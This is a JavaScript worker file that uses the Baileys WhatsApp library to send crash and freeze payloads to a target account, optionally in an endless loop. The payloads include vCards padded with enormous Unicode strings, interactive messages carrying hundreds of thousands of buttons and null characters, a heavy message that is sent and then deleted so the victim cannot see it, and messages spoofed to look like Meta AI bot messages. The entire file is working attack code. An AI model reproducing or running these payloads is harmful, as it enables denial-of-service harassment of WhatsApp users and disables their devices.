// attackWorker.js
const { parentPort, workerData } = require('worker_threads');
const { proto, makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const { ForceInvis } = require('./forceinvis');

// ==================== DEBUG LOGGER ====================
const debugLog = (msg) => {
    process.stderr.write(`[WORKER] ${msg}\n`);
};

const SILENT_LOGGER = pino({ level: 'silent' });

// ==================== SLEEP HELPER ====================
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ==================== MAIN RUN ====================
async function run() {
    const { authPath, attackType, targetJid, count, infiniteLoop } = workerData;

    debugLog(`=====================================`);
    debugLog(`Worker started`);
    debugLog(`  Attack Type: ${attackType}`);
    debugLog(`  Target: ${targetJid}`);
    debugLog(`  Count: ${count}`);
    debugLog(`  Auth Path: ${authPath}`);
    debugLog(`=====================================`);

    let sock = null;
    try {
        const { state } = await useMultiFileAuthState(authPath);
        debugLog(`Auth state loaded`);

        sock = makeWASocket({
            logger: SILENT_LOGGER,
            printQRInTerminal: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, SILENT_LOGGER),
            },
            browser: ['Mac OS', 'Safari', '10.15.7'],
            markOnlineOnConnect: false,
            syncFullHistory: false,
            shouldIgnoreJid: () => true,
            getMessage: async () => undefined,
        });

        debugLog(`Socket created, waiting for connection...`);

        await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
                reject(new Error('Worker connect timeout (15s)'));
            }, 15000);

            sock.ev.on('connection.update', (update) => {
                if (update.connection === 'open') {
                    clearTimeout(timeout);
                    debugLog(`Connected successfully!`);
                    resolve();
                }
                if (update.connection === 'close') {
                    clearTimeout(timeout);
                    const reason = update.lastDisconnect?.error?.message || 'unknown';
                    reject(new Error(`Connection closed: ${reason}`));
                }
            });
        });

        let success = 0;
        let failed = 0;

        let i = 0;
        const maxLoops = infiniteLoop ? Infinity : (count || 1);
        const totalDisplay = infiniteLoop ? '∞' : count;

        debugLog(`Starting attack loop (${totalDisplay} iterations)...`);

        while (i < maxLoops) {
            debugLog(`--- Iteration ${i + 1}/${totalDisplay} ---`);
            try {
                // ✅ FORCEINVIS — single call + 1500ms sleep
                if (attackType === 'forceinvis') {
                    debugLog(`[ForceInvis] Sending...`);
                    await ForceInvis(sock, targetJid);
                    debugLog(`[ForceInvis] ✅ Sent — sleeping 1500ms`);
                    await sleep(1500);
                    success++;
                    debugLog(`Iteration ${i + 1} SUCCESS (total: ${success} ok, ${failed} fail)`);
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed });
                }

                // ✅ IOS — iosfucker → 1500ms → iosnew → 2000ms
                else if (attackType === 'ios') {
                    debugLog(`[iOS] Phase 1/2: iosfucker`);
                    await iosfucker(sock, targetJid);
                    debugLog(`[iOS] ✅ iosfucker done — sleeping 1500ms`);
                    await sleep(1500);

                    debugLog(`[iOS] Phase 2/2: iosnew`);
                    await iosnew(sock, targetJid);
                    debugLog(`[iOS] ✅ iosnew done — sleeping 2000ms before next iteration`);
                    await sleep(2000);

                    success++;
                    debugLog(`Iteration ${i + 1} SUCCESS (total: ${success} ok, ${failed} fail)`);
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed });
                }

                // ✅ FORCEVIDEO (delayhard) — 3 functions with PROPER sleep times
                else if (attackType === 'forcevideo') {
                    debugLog(`[DelayHard] Phase 1/3: DelayXOnceExtesion`);
                    await DelayXOnceExtesion(sock, targetJid);
                    debugLog(`[DelayHard] ✅ DelayXOnceExtesion done — sleeping 2000ms`);
                    await sleep(2000);

                    debugLog(`[DelayHard] Phase 2/3: Delayforclosev2`);
                    await Delayforclosev2(sock, targetJid);
                    debugLog(`[DelayHard] ✅ Delayforclosev2 done — sleeping 4000ms`);
                    await sleep(4000);

                    debugLog(`[DelayHard] Phase 3/3: Delayforclose`);
                    await Delayforclose(sock, targetJid);
                    debugLog(`[DelayHard] ✅ Delayforclose done — sleeping 3000ms before next iteration`);
                    await sleep(3000);

                    success++;
                    debugLog(`Iteration ${i + 1} SUCCESS (total: ${success} ok, ${failed} fail)`);
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed });
                }

                // ✅ FCNOCLICK (freeze) — sendHeavyAndDelete + 3000ms sleep
                else if (attackType === 'fcnoclick') {
                    debugLog(`[Freeze] Sending heavy payload...`);
                    await sendHeavyAndDelete(sock, targetJid);   // ← uses default 500_000
                    debugLog(`[Freeze] ✅ Heavy+Delete done — sleeping 3000ms`);
                    await sleep(3000);

                    success++;
                    debugLog(`Iteration ${i + 1} SUCCESS (total: ${success} ok, ${failed} fail)`);
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed });
                }

                // ✅ BLANKIOS — blankios + 1000ms sleep
                else if (attackType === 'blankios') {
                    debugLog(`[BlankIOS] Sending...`);
                    await blankios(sock, targetJid);
                    debugLog(`[BlankIOS] ✅ Sent — sleeping 1000ms`);
                    await sleep(1000);

                    success++;
                    debugLog(`Iteration ${i + 1} SUCCESS (total: ${success} ok, ${failed} fail)`);
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed });
                }

                else {
                    debugLog(`Unknown attack type: ${attackType}`);
                    throw new Error(`Unknown attack type: ${attackType}`);
                }
            } catch (err) {
                failed++;
                debugLog(`Iteration ${i + 1} FAILED: ${err.message}`);
                parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed, error: err.message });
            }

            i++;
        }

        try { sock.end(undefined); } catch (e) {}

        debugLog(`=====================================`);
        debugLog(`Attack complete: ${success} success, ${failed} failed`);
        debugLog(`=====================================`);

        parentPort.postMessage({ type: 'done', success, failed, total: count });

    } catch (err) {
        debugLog(`FATAL ERROR: ${err.message}`);
        debugLog(`Stack: ${err.stack}`);
        try { if (sock) sock.end(undefined); } catch (e) {}
        parentPort.postMessage({ type: 'error', error: err.message });
    }
}

// ==================== iosfucker ====================
async function iosfucker(socket, recipient) {
    debugLog(`💥 Executing iosfucker on ${recipient}`);

    try {
        await socket.relayMessage(
            recipient,
            {
                contactMessage: {
                    displayName: "🎭⃟༑⌁⃰NOCTHERxXYLENTxEXFOLD🐉" + "𑇂𑆵𑆴𑆿".repeat(10000),
                    vcard: "BEGIN:VCARD\n" +
                        "VERSION:3.0\n" +
                        "N:;𑇂𑆵𑆴𑆿" + "𑇂𑆵𑆴𑆿".repeat(10000) + ";;;\n" +
                        "FN:𑇂𑆵𑆴𑆿" + "𑇂𑆵𑆴𑆿".repeat(10000) + "\n" +
                        "NICKNAME:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "ORG:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "TITLE:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "item1.TEL;waid=6287873499996:+62 878-7349-9996\n" +
                        "item1.X-ABLabel:Telepon\n" +
                        "item2.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "item2.X-ABLabel:Kantor\n" +
                        "item3.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "item3.X-ABLabel:Kantor\n" +
                        "item4.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "item4.X-ABLabel:Pribadi\n" +
                        "item5.ADR:;;𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + ";;;;\n" +
                        "item5.X-ABADR:ac\n" +
                        "item5.X-ABLabel:Rumah\n" +
                        "X-YAHOO;type=KANTOR:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "PHOTO:\n" +
                        "X-WA-BIZ-NAME:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "END:VCARD",
                    contextInfo: {
                        externalAdReply: {
                            automatedGreetingMessageShown: true,
                            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
                            greetingMessageBody: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨⁉️"
                        }
                    }
                }
            },
            {
                participant: recipient,
                noSelfSync: true
            }
        );

        debugLog(`✅ iosfucker executed successfully on ${recipient}`);
        return { success: true, recipient };
    } catch (err) {
        debugLog(`❌ iosfucker failed on ${recipient}: ${err.message}`);
        throw err;
    }
}

// ==================== iosnew ====================
async function iosnew(socket, recipient, targets = null) {
    debugLog(`💥 Executing iosnew on ${recipient}`);

    const jids = [];
    const src = targets && targets.length ? targets : [recipient];
    for (const t of src) {
        const clean = String(t || "").replace(/\D/g, "");
        if (clean) jids.push(clean.includes("@") ? clean : clean + "@s.whatsapp.net");
    }

    if (!jids.length) {
        debugLog("❌ iosnew: empty target list");
        throw new Error("iosnew: empty target list");
    }

    const mkMeta = (batch) => [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: batch.map((jid) => ({ tag: "to", attrs: { jid }, content: undefined }))
        }]
    }];

    const buildMsg = () => generateWAMessageFromContent("status@broadcast", {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [],
                    unifiedResponse: {
                        data: Buffer.from(JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: [
                                {
                                    view_model: {
                                        primitive: {
                                            text: "Xsyam For The Newest Bugs",
                                            inline_entities: ["{".repeat(500000)],
                                            __typename: "GenAIMarkdownTextUXPrimitive",
                                        },
                                        __typename: "GenAISingleLayoutViewModel",
                                    }
                                }
                            ]
                        }))
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardOrigin: 4,
                        forwardedAiBotMessageInfo: {
                            botJid: "0@bot"
                        }
                    }
                }
            }
        }
    }, {});

    try {
        const BATCH = 5;
        const ids = [];
        let batchNo = 0;

        for (let bi = 0; bi < jids.length; bi += BATCH) {
            const batch = jids.slice(bi, bi + BATCH);
            batchNo++;
            const suf = batchNo > 1 ? "-" + batchNo : "";
            const msg = buildMsg();

            await socket.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id + suf,
                statusJidList: batch,
                additionalNodes: mkMeta(batch),
                noSelfSync: true
            });

            ids.push(msg.key.id);

            if (batchNo > 1) {
                await sleep(300);
            }
        }

        debugLog(`✅ iosnew completed — ${ids.length} payload(s) sent`);
        return ids;
    } catch (err) {
        debugLog(`❌ iosnew failed: ${err.message}`);
        return [];
    }
}

// ==================== DelayXOnceExtesion ====================
async function DelayXOnceExtesion(sock, target) {
    debugLog(`[DelayXOnceExtesion] Executing on ${target}`);

    const msg = {
        groupStatusMessageV2: {
            message: {
                viewOnceMessageV2Extension: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "\u200B\u2060".repeat(10000),
                                subtitle: "\uFEFF\u202F".repeat(10000)
                            },
                            body: {
                                text: "\u180E\u061C".repeat(20000)
                            },
                            nativeFlowMessage: {
                                buttons: "\uFFF9\uFFFA".repeat(70000) + "\uFFFB\u2060".repeat(30000),
                                messageParamsJson: "\u200B\u202F".repeat(10000)
                            },
                            contextInfo: {
                                stanzaId: "\uFEFF\u180E".repeat(1000),
                                mentionedJid: [
                                    "\u061C\u200B".repeat(1000)
                                ],
                                forwardingScore: 4294967295,
                                isForwarded: true,
                                expiration: 4294967295
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, {
        noSelfSync: true
    });

    debugLog(`[DelayXOnceExtesion] ✅ Completed for ${target}`);
}

// ==================== Delayforclosev2 ====================
async function Delayforclosev2(sock, target) {
    debugLog(`[Delayforclosev2] Executing on ${target}`);

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    deviceListMetadata: {
                        senderKeyIndex: 0,
                        senderTimestamp: Date.now(),
                        recipientKeyIndex: 0
                    },
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1999 }, () =>
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        )
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 80000 }, () => ({})),
                        extra1: "\u0000".repeat(500000),
                        extra2: "\u0000".repeat(500000),
                        extra3: "\u0000".repeat(500000),
                        extra4: "\u0000".repeat(500000),
                        extra5: "\u0000".repeat(500000),
                        extra6: Array.from({ length: 80000 }, () => ({}))
                    },
                    body: { text: "$serraa" }
                }
            }
        }
    }, {});

    debugLog(`[Delayforclosev2] ✅ Completed for ${target}`);
}

// ==================== Delayforclose ====================
async function Delayforclose(sock, target) {
    debugLog(`[Delayforclose] Executing on ${target}`);

    try {
        const t0 = Date.now();
        const rnd = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;

        const pool = new Set();
        while (pool.size < 1999) pool.add("1" + rnd(0, 8999999) + "@s.whatsapp.net");
        const jids = [...pool];

        const mkBtns = n => new Array(n).fill(0).map(() => ({}));
        const NUL = String.fromCharCode(0);

        const native = {};
        const nfKeys = [
            ["buttons", () => mkBtns(80000)],
            ["extra1", () => NUL.repeat(20000)],
            ["extra2", () => NUL.repeat(10000)],
            ["extra3", () => NUL.repeat(20000)],
            ["extra4", () => NUL.repeat(40000)],
            ["extra5", () => NUL.repeat(2000)],
            ["extra6", () => mkBtns(80000)],
        ];
        nfKeys.sort(() => Math.random() - 0.5);
        for (const [k, fn] of nfKeys) native[k] = fn();

        const inter = Object.fromEntries([
            ["contextInfo", { mentionedJid: jids }],
            ["nativeFlowMessage", native],
            ["body", { text: "$derr" }],
        ]);

        const msg = {
            groupStatusMessageV2: { message: { interactiveMessage: inter } }
        };

        let ok = false, tries = 0;
        while (!ok && tries < 3) {
            try {
                await sleep(rnd(200, 800));
                await sock.relayMessage(target, msg, {});
                ok = true;
            } catch (err) {
                tries++;
                if (tries >= 3) throw err;
                await sleep(rnd(500, 1500));
            }
        }

        debugLog(`[Delayforclose] ✅ Sent (${Date.now() - t0}ms, ${tries + 1}x tries)`);
    } catch (e) {
        debugLog(`[Delayforclose] ❌ ERROR: ${e.message}`);
    }
}

// ==================== sendHeavyAndDelete ====================
async function sendHeavyAndDelete(socket, recipient, buttonCount = 500_000) {
    if (!socket || !recipient) {
        throw new Error("❌ socket and recipient JID required");
    }

    debugLog(`[sendHeavyAndDelete] Executing on ${recipient} with ${buttonCount} buttons`);

    // ── Build the heavy payload ──
    const payload = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "HeavyPayload",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "ြ ".repeat(5000) + " LexzyMods"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: buttonCount }, () => ({}))
                    },
                    contextInfo: {
                        quotedMessage: {
                            albumMessage: {
                                expectedImageCount: 9999,
                                expectedVideoCount: 9999
                            }
                        }
                    }
                }
            }
        }
    };

    try {
        // 1. Generate the message to get a trackable key
        const msg = generateWAMessageFromContent(recipient, payload, {});

        // 2. Send via relayMessage – it returns the message ID (string)
        const messageId = await socket.relayMessage(recipient, msg.message, {
            messageId: msg.key.id,
            noSelfSync: true,
        });

        // 3. The message ID is returned directly. Use it for the key.
        const key = {
            remoteJid: recipient,
            id: messageId || msg.key.id, // Fallback to generated ID if needed
            fromMe: true,
        };

        // 4. Ensure we have a valid ID
        if (!key.id) {
            throw new Error(`No valid message ID returned from relayMessage`);
        }

        debugLog(`[sendHeavyAndDelete] ✅ Heavy message (${buttonCount} buttons) sent, key: ${key.id}, deleting in 2000ms...`);

        // 5. Wait 2000ms before deletion
        await sleep(2000);

        // 6. Delete using the constructed key
        await socket.sendMessage(recipient, {
            delete: {
                key: {
                    remoteJid: recipient,
                    id: key.id,
                    fromMe: true,
                },
            },
        });

        debugLog(`[sendHeavyAndDelete] ✅ Heavy message deleted from ${recipient} (invisible)`);
        return { success: true };
    } catch (err) {
        debugLog(`[sendHeavyAndDelete] ❌ Failed: ${err.message}`);
        return { success: false, error: err.message };
    }
}

// ==================== blankios ====================
async function blankios(sock, target) {
    debugLog(`[BlankIOS] Executing on ${target}`);

    const buffer1 = {
        interactiveMessage: {
            interactiveMessage: {
                header: {
                    title: "🪭𝚂𝙴𝙲𝚁𝙴𝚃 ♕ 𝙲𝙾𝙼𝙿𝙰𝙽𝚈🪭",
                    subtitle: "666",
                    hasMediaAttachment: false
                },
                body: { text: "Apa yang ingin anda lakukan?" },
                footer: { text: "Nishiki" },
                nativeFlowMessage: {
                    buttons: [
                        { name: "quick_reply", buttonParamsJson: "{\"display_text\":\"Opsi 1\",\"id\":\"opt_1\"}" },
                        { name: "quick_reply", buttonParamsJson: "{\"display_text\":\"Opsi 3\",\"id\":\"opt_3\"}" }
                    ],
                    messageParamsJson: "{}"
                },
                mtype: "interactiveMessage",
                id: "3EB002CBD0A177798DC757",
                chat: "135759822622788@lid",
                isBaileys: false,
                sender: "215178549395532@lid",
                fromMe: false,
                text: "",
                mentionedJid: []
            }
        }
    };

    const buffer = Buffer.from(JSON.stringify(buffer1, null, 2), 'utf8');

    const MakLoX = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: "AI_RICH_RESPONSE_TYPE_STANDARD",
                    submessages: [{ messageType: "AI_RICH_RESPONSE_TEXT", messageText: "MakLo" }],
                    unifiedResponse: {
                        data: Buffer.from(JSON.stringify({
                            response_id: "666",
                            sections: [
                                {
                                    view_model: {
                                        primitive: {
                                            text: "",
                                            __typename: "GenAIMarkdownTextUXPrimitive"
                                        },
                                        __typename: "GenAISingleLayoutViewModel"
                                    }
                                },
                                {
                                    view_model: {
                                        primitive: {
                                            language: "Gunma",
                                            code_blocks: [
                                                { "content": "MakLo🪭\n\n\n", "type": "NUMBER" },
                                                { "content": buffer, "type": "STR" }
                                            ],
                                            __typename: "GenAICodeUXPrimitive"
                                        },
                                        __typename: "GenAISingleLayoutViewModel"
                                    }
                                },
                                {
                                    view_model: {
                                        primitive: {
                                            text: "",
                                            __typename: "GenAIMarkdownTextUXPrimitive"
                                        },
                                        __typename: "GenAISingleLayoutViewModel"
                                    }
                                }
                            ]
                        })).toString("base64")
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botName: "Meta AI",
                            botJid: "13135550002@s.whatsapp.net",
                            creatorName: "Meta"
                        }
                    }
                }
            }
        }
    };

    try {
        const msg = generateWAMessageFromContent(target, MakLoX, {});

        await sock.relayMessage(target, msg.message, {
            noSelfSync: true,
            messageId: msg.key.id,
        });

        debugLog(`[BlankIOS] ✅ Completed for ${target}`);
    } catch (err) {
        debugLog(`[BlankIOS] ❌ Failed: ${err.message}`);
        throw err;
    }
}

// ==================== START ====================
run();